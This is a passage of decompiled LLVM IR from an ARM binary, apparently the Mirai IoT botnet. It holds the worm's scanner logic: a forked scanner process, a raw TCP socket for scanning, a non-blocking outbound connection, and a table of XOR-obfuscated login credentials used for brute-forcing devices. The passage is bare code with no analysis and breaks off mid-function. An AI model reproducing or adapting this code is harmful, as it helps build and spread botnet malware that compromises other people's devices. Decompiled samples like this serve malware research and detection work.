  %v5_f2e8 = xor i32 %v4_f2e8, %v2_f2e0
  %v2_f2ec = xor i32 %v5_f2e4, %v5_f2e8
  %v2_f2f0 = load i32, i32* @global_var_23604.149, align 4
  %v2_f2f4 = load i32, i32* @global_var_23608.151, align 4
  store i32 %v2_f2f4, i32* %ip.global-to-local, align 4
  %v4_f2f8 = udiv i32 %v5_f2e8, 256
  %v5_f2f8 = xor i32 %v2_f2ec, %v4_f2f8
  store i32 %v5_f2f8, i32* @r4, align 4
  %v2_f300 = inttoptr i32 %v1_f300 to i32*
  store i32 %v2_f2f0, i32* %v2_f300, align 4
  %v0_f304 = load i32, i32* %ip.global-to-local, align 4
  %v1_f304 = load i32, i32* %r8.global-to-local, align 4
  %v2_f304 = inttoptr i32 %v1_f304 to i32*
  store i32 %v0_f304, i32* %v2_f304, align 4
  %v0_f308 = load i32, i32* %r2.global-to-local, align 4
  %v1_f308 = load i32, i32* %r7.global-to-local, align 4
  %v2_f308 = inttoptr i32 %v1_f308 to i32*
  store i32 %v0_f308, i32* %v2_f308, align 4
  %v0_f30c = load i32, i32* @r4, align 4
  %v1_f30c = load i32, i32* @r6, align 4
  %v2_f30c = inttoptr i32 %v1_f30c to i32*
  store i32 %v0_f30c, i32* %v2_f30c, align 4
  %v2_f310 = call i32 @util_strlen(i8* %v2_f2bc)
  %v0_f318 = load i32, i32* @r4, align 4
  %v3_f31c = urem i32 %v0_f318, %v2_f310
  %v2_f324 = add i32 %v3_f31c, %v2_f320
  %v1_f328 = add i32 %v2_f324, -32
  %v2_f328 = inttoptr i32 %v1_f328 to i8*
  %v3_f328 = load i8, i8* %v2_f328, align 1
  %v2_f32c = load i32, i32* @r5, align 4
  %v3_f32c = load i32, i32* %fp.global-to-local, align 4
  %v4_f32c = add i32 %v3_f32c, %v2_f32c
  %v5_f32c = inttoptr i32 %v4_f32c to i8*
  store i8 %v3_f328, i8* %v5_f32c, align 1
  %v0_f330 = load i32, i32* @r5, align 4
  %v1_f330 = add i32 %v0_f330, 1
  store i32 %v1_f330, i32* @r5, align 4
  %v1_f334 = load i32, i32* %sb.global-to-local, align 4
  %v9_f334 = icmp eq i32 %v1_f330, %v1_f334
  br i1 %v9_f334, label %dec_label_pc_f33c, label %dec_label_pc_f2dc.dec_label_pc_f2dc_crit_edge

dec_label_pc_f2dc.dec_label_pc_f2dc_crit_edge:    ; preds = %dec_label_pc_f2dc
  %v1_f300.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_f2dc

dec_label_pc_f33c:                                ; preds = %dec_label_pc_f2dc, %entry
  %v1_f340 = call i32 @table_lock_val(i32 61)
  store i32 %v3_f290, i32* @r4, align 4
  store i32 %v6_f290, i32* @r5, align 4
  store i32 %v9_f290, i32* @r6, align 4
  ret i32 %v1_f340

; uselistorder directives
  uselistorder i32 %v2_f2e0, { 1, 0 }
  uselistorder i32 %v2_f2dc, { 1, 0, 2 }
  uselistorder i32* @global_var_2360c.147, { 2, 4, 1, 0, 3 }
  uselistorder i32* @global_var_23608.151, { 2, 4, 1, 0, 3 }
  uselistorder i32* @global_var_23604.149, { 2, 5, 3, 1, 0, 4 }
  uselistorder i32* @global_var_23600.145, { 2, 4, 1, 0, 3 }
}

define i32 @scanner_kill(i32 %arg1) local_unnamed_addr {
entry:
  %v2_f36c = load i32, i32* @global_var_2612c.161, align 4
  %v2_f374 = call i32 @kill(i32 %v2_f36c, i32 9)
  ret i32 %v2_f374

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 5, 4, 3, 2, 1, 0 }
}

define i32 @setup_connection() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_f388 = load i32, i32* @r4, align 4
  store i32 %v3_f388, i32* %stack_var_-16, align 4
  %v6_f388 = load i32, i32* @r5, align 4
  %v9_f388 = load i32, i32* @r6, align 4
  %v12_f388 = load i32, i32* @lr, align 4
  %v0_f38c = load i32, i32* @r0, align 4
  store i32 %v0_f38c, i32* @r5, align 4
  %v1_f390 = add i32 %v0_f38c, 4
  %v2_f390 = inttoptr i32 %v1_f390 to i32*
  %v3_f390 = load i32, i32* %v2_f390, align 4
  store i32 %v3_f390, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 0, i32* %stack_var_-32, align 4
  store i32 62388, i32* @lr, align 4
  %v1_f3b0 = icmp ne i32 %v3_f390, -1
  call void @__pseudo_cond_branch(i1 %v1_f3b0, i32 ptrtoint (i32* @global_var_15730.34 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_f3bc = load i32, i32* @r6, align 4
  store i32 %v0_f3bc, i32* %r2.global-to-local, align 4
  %v3_f3c0 = call i32 @socket(i32 2, i32 1, i32 %v0_f3bc)
  store i32 %v3_f3c0, i32* %r0.global-to-local, align 4
  %v7_f3c4 = icmp eq i32 %v3_f3c0, -1
  %v1_f3c8 = load i32, i32* @r5, align 4
  %v2_f3c8 = add i32 %v1_f3c8, 4
  %v3_f3c8 = inttoptr i32 %v2_f3c8 to i32*
  store i32 %v3_f3c0, i32* %v3_f3c8, align 4
  br i1 %v7_f3c4, label %entry.dec_label_pc_f440_crit_edge, label %dec_label_pc_f3d0

entry.dec_label_pc_f440_crit_edge:                ; preds = %entry
  %v1_f448.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f440

dec_label_pc_f3d0:                                ; preds = %entry
  %v2_f394 = ptrtoint i32* %stack_var_-32 to i32
  %v0_f3d0 = load i32, i32* @r5, align 4
  %v1_f3d0 = add i32 %v0_f3d0, 28
  store i32 %v1_f3d0, i32* %r0.global-to-local, align 4
  %v0_f3d4 = load i32, i32* @r6, align 4
  %v2_f3d4 = add i32 %v0_f3d0, 24
  %v3_f3d4 = inttoptr i32 %v2_f3d4 to i32*
  store i32 %v0_f3d4, i32* %v3_f3d4, align 4
  %v2_f3dc = call i32 @util_zero(i32 %v1_f3d0, i32 256)
  store i32 %v2_f3dc, i32* %r0.global-to-local, align 4
  %v0_f3e0 = load i32, i32* @r5, align 4
  %v1_f3e0 = add i32 %v0_f3e0, 4
  %v2_f3e0 = inttoptr i32 %v1_f3e0 to i32*
  %v3_f3e0 = load i32, i32* %v2_f3e0, align 4
  store i32 %v3_f3e0, i32* @r4, align 4
  %v0_f3e4 = load i32, i32* @r6, align 4
  store i32 %v0_f3e4, i32* @r2, align 4
  store i32 %v3_f3e0, i32* %r0.global-to-local, align 4
  %v2_f3f0 = call i32 @__libc_fcntl(i32 %v3_f3e0, i32 3)
  %v1_f3f8 = or i32 %v2_f3f0, 2048
  store i32 %v1_f3f8, i32* @r2, align 4
  %v0_f3fc = load i32, i32* @r4, align 4
  store i32 %v0_f3fc, i32* %r0.global-to-local, align 4
  %v2_f400 = call i32 @__libc_fcntl(i32 %v0_f3fc, i32 4)
  store i32 %v2_f400, i32* %r0.global-to-local, align 4
  %v2_f408 = load i32, i32* @global_var_23644.163, align 4
  store i32 %v2_f408, i32* %r2.global-to-local, align 4
  %v1_f410 = load i32, i32* @r5, align 4
  %v2_f410 = add i32 %v1_f410, 12
  %v3_f410 = inttoptr i32 %v2_f410 to i32*
  store i32 1, i32* %v3_f410, align 4
  store i32 2, i32* %stack_var_-32, align 4
  %v0_f41c = load i32, i32* %r2.global-to-local, align 4
  %v1_f41c = load i32, i32* @r5, align 4
  %v2_f41c = add i32 %v1_f41c, 8
  %v3_f41c = inttoptr i32 %v2_f41c to i32*
  store i32 %v0_f41c, i32* %v3_f41c, align 4
  %v0_f420 = load i32, i32* @r5, align 4
  %v1_f424 = add i32 %v0_f420, 4
  %v2_f424 = inttoptr i32 %v1_f424 to i32*
  %v3_f424 = load i32, i32* %v2_f424, align 4
  store i32 %v3_f424, i32* %r0.global-to-local, align 4
  %v1_f428 = add i32 %v0_f420, 20
  %v2_f428 = inttoptr i32 %v1_f428 to i16*
  %v3_f428 = load i16, i16* %v2_f428, align 2
  %v4_f428 = zext i16 %v3_f428 to i32
  store i32 %v4_f428, i32* @r5, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_f43c = call i32 @__libc_connect(i32 %v3_f424, i32 %v2_f394, i32 16)
  store i32 %v3_f43c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f440

dec_label_pc_f440:                                ; preds = %entry.dec_label_pc_f440_crit_edge, %dec_label_pc_f3d0
  %v1_f448 = phi i32 [ %v1_f448.pre, %entry.dec_label_pc_f440_crit_edge ], [ %v3_f43c, %dec_label_pc_f3d0 ]
  %v2_f444 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_f444, i32* @r4, align 4
  store i32 %v6_f388, i32* @r5, align 4
  store i32 %v9_f388, i32* @r6, align 4
  store i32 %v12_f388, i32* @lr, align 4
  ret i32 %v1_f448

; uselistorder directives
  uselistorder i32 %v3_f3c0, { 1, 0, 2 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 3, 2, 4, 6, 5, 9, 10, 8, 7 }
  uselistorder i32 (i32, i32)* @util_zero, { 12, 9, 8, 7, 11, 10, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_f440, { 1, 0 }
}

define i32 @add_auth_entry(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_f450 = load i32, i32* @r4, align 4
  %v6_f450 = load i32, i32* @r5, align 4
  %v9_f450 = load i32, i32* @r6, align 4
  %v12_f450 = load i32, i32* @r7, align 4
  %v15_f450 = load i32, i32* @r8, align 4
  %v18_f450 = load i32, i32* @sb, align 4
  %v21_f450 = load i32, i32* @sl, align 4
  %v24_f450 = load i32, i32* @fp, align 4
  store i32 ptrtoint (i32* @global_var_23610.165 to i32), i32* @fp, align 4
  %v2_f458 = load i32, i32* @global_var_23610.165, align 4
  store i32 ptrtoint (i32* @global_var_2363c.167 to i32), i32* @sl, align 4
  %v1_f464 = add i32 %v2_f458, 1
  store i32 %v1_f464, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  %v2_f470 = load i32, i32* @global_var_2363c.167, align 4
  store i32 %v2_f470, i32* %r0.global-to-local, align 4
  %v3_f474 = mul i32 %v1_f464, 16
  store i32 %v3_f474, i32* %r1.global-to-local, align 4
  %v4_f47c = inttoptr i32 %v2_f470 to i32*
  %v5_f47c = call i32 @realloc(i32* %v4_f47c, i32 %v3_f474, i32 %arg3, i32 %v1_f464)
  %v2_f480 = load i32, i32* @global_var_23610.165, align 4
  store i32 %v2_f480, i32* %r2.global-to-local, align 4
  store i32 %v5_f47c, i32* @r8, align 4
  %v0_f488 = load i32, i32* @r5, align 4
  store i32 %v0_f488, i32* %r0.global-to-local, align 4
  %v1_f490 = load i32, i32* @sl, align 4
  %v2_f490 = inttoptr i32 %v1_f490 to i32*
  store i32 %v5_f47c, i32* %v2_f490, align 4
  %v1_f494 = inttoptr i32 %v0_f488 to i8*
  %v2_f494 = call i32 @util_strlen(i8* %v1_f494)
  %sext = mul i32 %v2_f494, 16777216
  %v1_f498 = sdiv i32 %sext, 16777216
  %v2_f498 = add nsw i32 %v1_f498, 1
  store i32 %v2_f498, i32* @r4, align 4
  store i32 %v1_f498, i32* @r7, align 4
  store i32 %v2_f498, i32* @r0, align 4
  %v0_f4a4 = call i32 @malloc()
  store i32 %v0_f4a4, i32* %r0.global-to-local, align 4
  %v0_f4a8 = load i32, i32* @r5, align 4
  store i32 %v0_f4a8, i32* %r1.global-to-local, align 4
  %v0_f4ac = load i32, i32* @r4, align 4
  store i32 %v0_f4ac, i32* %r2.global-to-local, align 4
  store i32 %v0_f4a4, i32* %r6.global-to-local, align 4
  %v3_f4b4 = call i32 @util_memcpy(i32 %v0_f4a4, i32 %v0_f4a8, i32 %v0_f4ac)
  store i32 %v3_f4b4, i32* %r0.global-to-local, align 4
  %v0_f4b8 = load i32, i32* @r7, align 4
  %tmp22 = icmp slt i32 %v0_f4b8, 1
  %extract.t6 = trunc i32 %v0_f4b8 to i8
  br i1 %tmp22, label %dec_label_pc_f4dc, label %dec_label_pc_f4c0

dec_label_pc_f4c0:                                ; preds = %entry
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_f4c4

dec_label_pc_f4c4:                                ; preds = %dec_label_pc_f4c4, %dec_label_pc_f4c0
  %v2_f4cc = phi i32 [ %v1_f4d0, %dec_label_pc_f4c4 ], [ 0, %dec_label_pc_f4c0 ]
  %v1_f4c4 = load i32, i32* %r6.global-to-local, align 4
  %v2_f4c4 = add i32 %v1_f4c4, %v2_f4cc
  %v3_f4c4 = inttoptr i32 %v2_f4c4 to i8*
  %v4_f4c4 = load i8, i8* %v3_f4c4, align 1
  %v6_f4c4 = zext i8 %v4_f4c4 to i32
  %v1_f4c8 = xor i32 %v6_f4c4, 80
  store i32 %v1_f4c8, i32* %r3.global-to-local, align 4
  %v1_f4cc = trunc i32 %v1_f4c8 to i8
  store i8 %v1_f4cc, i8* %v3_f4c4, align 1
  %v0_f4d0 = load i32, i32* %r2.global-to-local, align 4
  %v1_f4d0 = add i32 %v0_f4d0, 1
  store i32 %v1_f4d0, i32* %r2.global-to-local, align 4
  %v1_f4d4 = load i32, i32* @r7, align 4
  %v9_f4d4 = icmp eq i32 %v1_f4d0, %v1_f4d4
  br i1 %v9_f4d4, label %dec_label_pc_f4dc.loopexit, label %dec_label_pc_f4c4

dec_label_pc_f4dc.loopexit:                       ; preds = %dec_label_pc_f4c4
  %extract.t = trunc i32 %v1_f4d0 to i8
  br label %dec_label_pc_f4dc

dec_label_pc_f4dc:                                ; preds = %dec_label_pc_f4dc.loopexit, %entry
  %v0_f4ec.off0 = phi i8 [ %extract.t, %dec_label_pc_f4dc.loopexit ], [ %extract.t6, %entry ]
  %v2_f4dc = load i32, i32* @global_var_23610.165, align 4
  %v2_f4e0 = load i32, i32* @global_var_2363c.167, align 4
  %v3_f4e4 = mul i32 %v2_f4dc, 16
  store i32 %v3_f4e4, i32* @sb, align 4
  %v2_f4e8 = add i32 %v2_f4e0, %v3_f4e4
  store i32 %v2_f4e8, i32* %r2.global-to-local, align 4
  %v3_f4ec = add i32 %v2_f4e8, 12
  %v4_f4ec = inttoptr i32 %v3_f4ec to i8*
  store i8 %v0_f4ec.off0, i8* %v4_f4ec, align 1
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %v2_f480, i32* %r3.global-to-local, align 4
  %v0_f4f8 = load i32, i32* %r6.global-to-local, align 4
  %v1_f4f8 = load i32, i32* @r8, align 4
  %v5_f4f8 = mul i32 %v2_f480, 16
  %v6_f4f8 = add i32 %v1_f4f8, %v5_f4f8
  %v7_f4f8 = inttoptr i32 %v6_f4f8 to i32*
  store i32 %v0_f4f8, i32* %v7_f4f8, align 4
  %v2_f4fc = load i32, i32* @global_var_2363c.167, align 4
  store i32 %v2_f4fc, i32* @r7, align 4
  %v1_f500 = inttoptr i32 %arg2 to i8*
  %v2_f500 = call i32 @util_strlen(i8* %v1_f500)
  %sext1 = mul i32 %v2_f500, 16777216
  %v1_f504 = sdiv i32 %sext1, 16777216
  %v2_f504 = add nsw i32 %v1_f504, 1
  store i32 %v2_f504, i32* @r4, align 4
  store i32 %v1_f504, i32* @r6, align 4
  store i32 %v2_f504, i32* @r0, align 4
  %v0_f510 = call i32 @malloc()
  store i32 %v0_f510, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v0_f518 = load i32, i32* @r4, align 4
  store i32 %v0_f518, i32* %r2.global-to-local, align 4
  store i32 %v0_f510, i32* %r5.global-to-local, align 4
  %v3_f520 = call i32 @util_memcpy(i32 %v0_f510, i32 %arg2, i32 %v0_f518)
  store i32 %v3_f520, i32* %r0.global-to-local, align 4
  %v0_f524 = load i32, i32* @r6, align 4
  %tmp23 = icmp slt i32 %v0_f524, 1
  %extract.t8 = trunc i32 %v0_f524 to i8
  br i1 %tmp23, label %dec_label_pc_f548, label %dec_label_pc_f52c

dec_label_pc_f52c:                                ; preds = %dec_label_pc_f4dc
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_f530

dec_label_pc_f530:                                ; preds = %dec_label_pc_f530, %dec_label_pc_f52c
  %v2_f538 = phi i32 [ %v1_f53c, %dec_label_pc_f530 ], [ 0, %dec_label_pc_f52c ]
  %v1_f530 = load i32, i32* %r5.global-to-local, align 4
  %v2_f530 = add i32 %v1_f530, %v2_f538
  %v3_f530 = inttoptr i32 %v2_f530 to i8*
  %v4_f530 = load i8, i8* %v3_f530, align 1
  %v6_f530 = zext i8 %v4_f530 to i32
  %v1_f534 = xor i32 %v6_f530, 80
  store i32 %v1_f534, i32* %r3.global-to-local, align 4
  %v1_f538 = trunc i32 %v1_f534 to i8
  store i8 %v1_f538, i8* %v3_f530, align 1
  %v0_f53c = load i32, i32* %r2.global-to-local, align 4
  %v1_f53c = add i32 %v0_f53c, 1
  store i32 %v1_f53c, i32* %r2.global-to-local, align 4
  %v1_f540 = load i32, i32* @r6, align 4
  %v9_f540 = icmp eq i32 %v1_f53c, %v1_f540
  br i1 %v9_f540, label %dec_label_pc_f548.loopexit, label %dec_label_pc_f530

dec_label_pc_f548.loopexit:                       ; preds = %dec_label_pc_f530
  %extract.t7 = trunc i32 %v1_f53c to i8
  br label %dec_label_pc_f548

dec_label_pc_f548:                                ; preds = %dec_label_pc_f548.loopexit, %dec_label_pc_f4dc
  %v0_f558.off0 = phi i8 [ %extract.t7, %dec_label_pc_f548.loopexit ], [ %extract.t8, %dec_label_pc_f4dc ]
  %v2_f548 = load i32, i32* @global_var_23610.165, align 4
  store i32 %v2_f548, i32* %r0.global-to-local, align 4
  %v2_f54c = load i32, i32* @global_var_2363c.167, align 4
  %v3_f550 = mul i32 %v2_f548, 16
  store i32 %v3_f550, i32* %r1.global-to-local, align 4
  %v2_f554 = or i32 %v3_f550, 13
  %v3_f558 = add i32 %v2_f554, %v2_f54c
  %v4_f558 = inttoptr i32 %v3_f558 to i8*
  store i8 %v0_f558.off0, i8* %v4_f558, align 1
  store i32 ptrtoint (i16** @global_var_23640.169 to i32), i32* %r4.global-to-local, align 4
  %v2_f564 = load i16, i16* bitcast (i16** @global_var_23640.169 to i16*), align 4
  %v3_f564 = zext i16 %v2_f564 to i32
  store i32 %v3_f564, i32* %lr.global-to-local, align 4
  %v2_f56c = load i32, i32* @global_var_2363c.167, align 4
  store i32 %v2_f56c, i32* %r2.global-to-local, align 4
  %v0_f574 = load i32, i32* %r1.global-to-local, align 4
  %v2_f574 = add i32 %v0_f574, %v2_f56c
  store i32 %v2_f574, i32* %r1.global-to-local, align 4
  store i32 lshr (i32 shl (i32 ptrtoint (i16** @global_var_23640.169 to i32), i32 16), i32 16), i32* %r3.global-to-local, align 4
  %v0_f57c = load i32, i32* @sb, align 4
  %v1_f57c = load i32, i32* @r7, align 4
  %v2_f57c = add i32 %v1_f57c, %v0_f57c
  store i32 %v2_f57c, i32* %ip.global-to-local, align 4
  %v0_f580 = load i32, i32* %r0.global-to-local, align 4
  %v1_f580 = add i32 %v0_f580, 1
  store i32 %v1_f580, i32* %r0.global-to-local, align 4
  %v3_f584 = add i32 %v2_f574, 10
  %v4_f584 = inttoptr i32 %v3_f584 to i16*
  store i16 trunc (i32 lshr (i32 shl (i32 ptrtoint (i16** @global_var_23640.169 to i32), i32 16), i32 16) to i16), i16* %v4_f584, align 2
  %v0_f588 = load i32, i32* %lr.global-to-local, align 4
  %v1_f588 = trunc i32 %v0_f588 to i16
  %v2_f588 = load i32, i32* %r1.global-to-local, align 4
  %v3_f588 = add i32 %v2_f588, 8
  %v4_f588 = inttoptr i32 %v3_f588 to i16*
  store i16 %v1_f588, i16* %v4_f588, align 2
  %v0_f58c = load i32, i32* %r5.global-to-local, align 4
  %v1_f58c = load i32, i32* %ip.global-to-local, align 4
  %v2_f58c = add i32 %v1_f58c, 4
  %v3_f58c = inttoptr i32 %v2_f58c to i32*
  store i32 %v0_f58c, i32* %v3_f58c, align 4
  %v1_f590 = load i32, i32* @fp, align 4
  %v2_f590 = inttoptr i32 %v1_f590 to i32*
  store i32 %v1_f580, i32* %v2_f590, align 4
  %v0_f594 = load i32, i32* %r3.global-to-local, align 4
  %v1_f594 = trunc i32 %v0_f594 to i16
  %v2_f594 = load i32, i32* %r4.global-to-local, align 4
  %v3_f594 = inttoptr i32 %v2_f594 to i16*
  store i16 %v1_f594, i16* %v3_f594, align 2
  store i32 %v3_f450, i32* @r4, align 4
  store i32 %v6_f450, i32* @r5, align 4
  store i32 %v9_f450, i32* @r6, align 4
  store i32 %v12_f450, i32* @r7, align 4
  store i32 %v15_f450, i32* @r8, align 4
  store i32 %v18_f450, i32* @sb, align 4
  store i32 %v21_f450, i32* @sl, align 4
  store i32 %v24_f450, i32* @fp, align 4
  ret i32 %v1_f580

; uselistorder directives
  uselistorder i32 %v3_f550, { 1, 0 }
  uselistorder i32 %v1_f53c, { 0, 2, 3, 1 }
  uselistorder i32 %v0_f510, { 1, 0, 2 }
  uselistorder i32 %v3_f4e4, { 1, 0 }
  uselistorder i32 %v1_f4d0, { 0, 2, 3, 1 }
  uselistorder i32 %v0_f4a4, { 1, 0, 2 }
  uselistorder i32 %v2_f480, { 1, 0, 2 }
  uselistorder i32 %v3_f474, { 1, 0 }
  uselistorder i32 %v1_f464, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0 }
  uselistorder i32 (i8*)* @util_strlen, { 0, 1, 18, 2, 19, 20, 21, 22, 23, 24, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81 }
  uselistorder i32 %arg2, { 3, 2, 1, 0, 4 }
}

define i32 @scanner_init(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp314 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-42 = alloca i32, align 4
  %stack_var_-77 = alloca i32, align 4
  %stack_var_-45 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-56 = alloca i8, align 1
  %stack_var_-352 = alloca i32, align 4
  %stack_var_-224 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-1866 = alloca i32, align 4
  %stack_var_-52 = alloca i16, align 2
  %tmp342 = call i16 @__decompiler_undefined_function_1()
  %v6_f5b0 = load i32, i32* @r5, align 4
  %v18_f5b0 = load i32, i32* @sb, align 4
  %v21_f5b0 = load i32, i32* @sl, align 4
  %v24_f5b0 = load i32, i32* @fp, align 4
  %v0_f5bc = call i32 @__libc_fork()
  store i32 %v0_f5bc, i32* %r0.global-to-local, align 4
  %v7_f5c0 = icmp eq i32 %v0_f5bc, -1
  %. = zext i1 %v7_f5c0 to i32
  %tmp345 = icmp slt i32 %v0_f5bc, 1
  %storemerge308 = select i1 %tmp345, i32 %., i32 1
  store i32 %storemerge308, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_2612c.161 to i32), i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f5dc = icmp eq i32 %storemerge308, 0
  store i1 %v2_f5dc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_f5bc, i32* @global_var_2612c.161, align 4
  br i1 %v2_f5dc, label %dec_label_pc_f5f8, label %dec_label_pc_f5e8

dec_label_pc_f5e8:                                ; preds = %entry
  store i32 %v6_f5b0, i32* @r5, align 4
  store i32 %v18_f5b0, i32* @sb, align 4
  store i32 %v21_f5b0, i32* @sl, align 4
  store i32 %v24_f5b0, i32* @fp, align 4
  ret i32 %v0_f5bc

dec_label_pc_f5f8:                                ; preds = %entry
  %v0_f5f8 = call i32 @util_local_addr()
  store i32 %v0_f5f8, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2610c.91 to i32), i32* %r1.global-to-local, align 4
  store i32 %v0_f5f8, i32* @global_var_2610c.91, align 4
  %v1_f604 = call i32 @rand_init(i32 %v0_f5f8)
  %v0_f608 = load i32, i32* @r4, align 4
  store i32 %v0_f608, i32* %r0.global-to-local, align 4
  %v1_f60c = inttoptr i32 %v0_f608 to i32*
  %v2_f60c = call i32 @__GI_time(i32* %v1_f60c)
  store i32 ptrtoint (i32* @global_var_23644.163 to i32), i32* %r2.global-to-local, align 4
  store i32 288, i32* %r1.global-to-local, align 4
  store i32 %v2_f60c, i32* @global_var_23644.163, align 4
  store i32 256, i32* %r0.global-to-local, align 4
  %v2_f620 = call i32 @calloc(i32 256, i32 288)
  store i32 ptrtoint (i32* @global_var_26124.174 to i32), i32* %r3.global-to-local, align 4
  %v0_f628 = load i32, i32* @r4, align 4
  %v5_f628 = trunc i32 %v0_f628 to i16
  store i16 %v5_f628, i16* %stack_var_-52, align 2
  store i32 %v2_f620, i32* @global_var_26124.174, align 4
  store i32 %v0_f628, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f634

dec_label_pc_f634:                                ; preds = %dec_label_pc_f634.dec_label_pc_f634_crit_edge, %dec_label_pc_f5f8
  %v2_f640 = phi i32 [ %v2_f640.pre, %dec_label_pc_f634.dec_label_pc_f634_crit_edge ], [ %v2_f620, %dec_label_pc_f5f8 ]
  %v0_f648 = phi i32 [ %v0_f678, %dec_label_pc_f634.dec_label_pc_f634_crit_edge ], [ %v0_f628, %dec_label_pc_f5f8 ]
  %v3_f634162 = phi i16 [ %v5_f678, %dec_label_pc_f634.dec_label_pc_f634_crit_edge ], [ %v5_f628, %dec_label_pc_f5f8 ]
  %v4_f634 = sext i16 %v3_f634162 to i32
  %v3_f63c = mul i32 %v0_f648, 256
  store i32 %v3_f63c, i32* %ip.global-to-local, align 4
  store i32 %v2_f640, i32* @lr, align 4
  %v2_f650 = mul nsw i32 %v4_f634, 288
  %v2_f654 = mul i32 %v0_f648, 288
  %v1_f658 = add nsw i32 %v4_f634, 1
  store i32 %v1_f658, i32* %r0.global-to-local, align 4
  %v2_f65c = add i32 %v2_f650, %v2_f640
  store i32 %v2_f65c, i32* %r2.global-to-local, align 4
  %v2_f660 = add i32 %v2_f654, %v2_f640
  store i32 %v2_f660, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 -1, i32* @r3, align 4
  %v2_f670 = add i32 %v2_f65c, 4
  %v3_f670 = inttoptr i32 %v2_f670 to i32*
  store i32 -1, i32* %v3_f670, align 4
  %v0_f674 = load i32, i32* @r5, align 4
  %v1_f674 = load i32, i32* %r1.global-to-local, align 4
  %v2_f674 = add i32 %v1_f674, 12
  %v3_f674 = inttoptr i32 %v2_f674 to i32*
  store i32 %v0_f674, i32* %v3_f674, align 4
  %v0_f678 = load i32, i32* %r0.global-to-local, align 4
  %v5_f678 = trunc i32 %v0_f678 to i16
  %v7_f67c = icmp sgt i16 %v3_f634162, 254
  br i1 %v7_f67c, label %dec_label_pc_f680, label %dec_label_pc_f634.dec_label_pc_f634_crit_edge

dec_label_pc_f634.dec_label_pc_f634_crit_edge:    ; preds = %dec_label_pc_f634
  %v2_f640.pre = load i32, i32* @global_var_26124.174, align 4
  br label %dec_label_pc_f634

dec_label_pc_f680:                                ; preds = %dec_label_pc_f634
  store i16 %v5_f678, i16* %stack_var_-52, align 2
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 6, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  %v3_f68c = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_f68c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_26128.176 to i32), i32* %r2.global-to-local, align 4
  %v2_f694 = icmp eq i32 %v3_f68c, -1
  store i1 %v2_f694, i1* %cpsr_c.global-to-local, align 1
  %v7_f694 = icmp eq i32 %v3_f68c, -1
  store i1 %v7_f694, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_f68c, i32* @r4, align 4
  store i32 %v3_f68c, i32* @global_var_26128.176, align 4
  br i1 %v7_f694, label %dec_label_pc_fe00, label %dec_label_pc_f6a4

